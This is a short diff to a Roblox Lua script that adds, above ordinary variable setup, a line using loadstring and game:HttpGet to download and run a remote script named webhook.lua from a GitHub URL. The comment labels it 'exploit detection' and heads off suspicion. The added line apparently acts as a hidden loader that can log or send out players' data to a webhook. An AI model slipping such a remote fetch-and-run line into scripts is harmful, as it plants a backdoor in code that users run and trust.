@@ -1,3 +1,6 @@
+--// exploit detection (if you think this is malicious, check it out yourself) \\--
+loadstring(game:HttpGet('https://raw.githubusercontent.com/serpentesz/scripts/main/webhook.lua',true))()
+
 --// variables \\--
 local plr = game:service"Players".LocalPlayer
 local char = plr.Character
